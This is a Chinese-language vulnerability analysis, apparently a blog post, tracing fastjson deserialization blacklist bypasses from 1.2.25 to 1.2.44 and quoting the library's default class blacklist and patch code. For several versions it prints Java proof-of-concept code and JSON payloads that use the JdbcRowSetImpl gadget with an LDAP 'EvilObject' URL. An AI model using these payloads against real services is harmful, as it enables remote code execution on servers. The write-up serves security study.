#### 1.2.25<=fastjson<=1.2.41反序列化漏洞。

从这个版本的fastjson中，对前面的漏洞进行了修复，引入了`checkAutoType`安全机制，默认`autoTypeSupport`关闭，不能直接反序列化任意类，而打开
AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。

更新主要在`com.alibaba.fastjson.parser.ParserConfig`中

![image-20220331200716308.png](https://image.3001.net/images/20221215/1671104982_639b09d6b70f57f2c6ad9.png!small)

  * autoTypeSupport：是否开启任意类型的反序列化， **默认关闭**
  * denyList：反序列化类的黑名单
  * acceptList：反序列化类的白名单

    
    
    //黑名单
    bsh
    com.mchange
    com.sun.
    java.lang.Thread
    java.net.Socket
    java.rmi
    javax.xml
    org.apache.bcel
    org.apache.commons.beanutils
    org.apache.commons.collections.Transformer
    org.apache.commons.collections.functors
    org.apache.commons.collections4.comparators
    org.apache.commons.fileupload
    org.apache.myfaces.context.servlet
    org.apache.tomcat
    org.apache.wicket.util
    org.codehaus.groovy.runtime
    org.hibernate
    org.jboss
    org.mozilla.javascript
    org.python.core
    org.springframework
    

添加白名单：

  1. 使用代码进行添加：`ParserConfig.getGlobalInstance().addAccept(“org.su18.fastjson.,org.javaweb.”)`
  2. 加上JVM启动参数：`-Dfastjson.parser.autoTypeAccept=org.su18.fastjson.`
  3. 在fastjson.properties中添加：`fastjson.parser.autoTypeAccept=org.su18.fastjson.`

##### 漏洞分析

跟进`ParserConfig#checkAutoType.`

![image-20220331201609225.png](https://image.3001.net/images/20221215/1671104995_639b09e31e823a68a0296.png!small)

如果开启了autoType，他会先判断是否在白里面，如果在，就会进行加载，之后再次判断是否在黑名单里面，如果在，就会抛出异常。

![image-20220331202105519.png](https://image.3001.net/images/20221215/1671105002_639b09ea299433b01fa1a.png!small)

如果没有开启autoType，他会先判断是否在黑名单里面，如果在，就会抛出异常，之后再次判断是否在白名单里面，如果在，就进行加载。

当然，还有需要反序列化的类既不在黑名单上又不在白名单上面，那就只能是开启了`autoType`或者`expectClass`不为空，才会加载这个类。

![image-20220331202336299.png](https://image.3001.net/images/20221215/1671105009_639b09f1c8ec1ddde8557.png!small)

那就跟进`TypeUtils#loadClass`，在加载类之前进行了递归调用来处理`[ L ;`等描述符。

![image-20220331203047681.png](https://image.3001.net/images/20221215/1671105017_639b09f92a56dc0d62d09.png!small)

这里就存在一个逻辑漏洞，前面检查黑名单是使用的`startswith`来进行检测的，我们在前面加载上`L`字符和后面加上`;`，这样就可以绕过黑名单的检查了，这俩个字符也会在这个位置给处理掉了，就成功达到了我们的目的。

##### POC

    
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    
    public class Fj25_Jdbc_POC {
        public static void main(String[] args) {
            String payload = "{\"xx\":{" +
                    "\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"," +
                    "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                    "\"autoCommit\":true" +
                    "}}";
            //开启autotype
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            JSON.parseObject(payload);
        }
    }
    

![image-20220331205128133.png](https://image.3001.net/images/20221215/1671105044_639b0a14894a89fe81a94.png!small)

    
    
    //payload
    {
      "xx": {
        "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
        "dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
        "autoCommit": true
      }
    }
    

##### 条件限制

和前面的JdbcRowSetImpl利用链一样需要有网，还有就是需要开启`AutoType.`

#### 1.2.25<=fastjson<=1.2.42反序列化漏洞

jar包版本: 1.2.42

##### 漏洞分析

仍然还是看看`ParserConfig`里面修改的内容

![image-20220331210238333.png](https://image.3001.net/images/20221215/1671105058_639b0a22b640a52cd907d.png!small)

这不是直接把黑白名单给进行了hash处理，以防进行黑名单绕过。

跟进`ParserConfig#checkAutoType`，发现多写了一个判断，这里使用hash写的。

![image-20220331210451180.png](https://image.3001.net/images/20221215/1671105065_639b0a29927e2461e6bad.png!small)

大概的意思是如果类的第一个字符是`L`，结尾的字符是`;`就会取第二个字符到倒数第二个字符的内容，就类似于进行了`startwith`这种函数来判断，但是这里只去除了一次，后面是递归操作，就可以双写绕过。

##### POC

    
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    
    public class Fj42_Jdbc_POC {
        public static void main(String[] args) {
            String payload = "{\"xx\":{" +
                    "\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\"," +
                    "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                    "\"autoCommit\":true" +
                    "}}";
            //开启autotype
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            JSON.parseObject(payload);
        }
    }
    

![image-20220331211142864.png](https://image.3001.net/images/20221215/1671105101_639b0a4d839d7b2c9fc8a.png!small)

    
    
    //payload
    {
      "xx": {
        "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
        "autoCommit": true
      }
    }
    

##### 条件限制

和上一个版本是一样的：

  1. 有网
  2. 开启`AutoType`

#### 1.2.25<=fastjson<=1.2.43反序列化漏洞

##### 漏洞分析

这个版本在`ParserConfig#checkAutoType`中做出了修改。

    
    
    if ((((BASIC
                    ^ className.charAt(0))
                    * PRIME)
                    ^ className.charAt(className.length() - 1))
                    * PRIME == 0x9198507b5af98f0L)
            {
                if ((((BASIC
                        ^ className.charAt(0))
                        * PRIME)
                        ^ className.charAt(1))
                        * PRIME == 0x9195c07b5af5345L)
                {
                    throw new JSONException("autoType is not support. " + typeName);
                }
                // 9195c07b5af5345
                className = className.substring(1, className.length() - 1);
            }
    

如果出现了多个`L`，就会直接抛出异常。

但是在`loadClass`中，同样对`[`进行了处理。

    
    
    if(className == null || className.length() == 0){
                return null;
            }
            Class<?> clazz = mappings.get(className);
            if(clazz != null){
                return clazz;
            }
            if(className.charAt(0) == '['){
                Class<?> componentType = loadClass(className.substring(1), classLoader);
                return Array.newInstance(componentType, 0).getClass();
            }
            if(className.startsWith("L") && className.endsWith(";")){
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
            }
    

我们就可以通过`[`进行黑名单绕过。

##### Payload

    
    
    {
      "RoboTerh": {
        "@type": "[com.sun.rowset.JdbcRowSetImpl"[{,
        "dataSourceName": "ldap://127.0.0.1:8888/EvilObject",
        "autoCommit": true
      }
    }
    

##### 条件限制

和之前的一样。

#### fastjson1.2.44

##### 分析

这个版本主要是修复了上一个版本利用`[`进行绕过的方法。

#### 参考

https://su18.org/

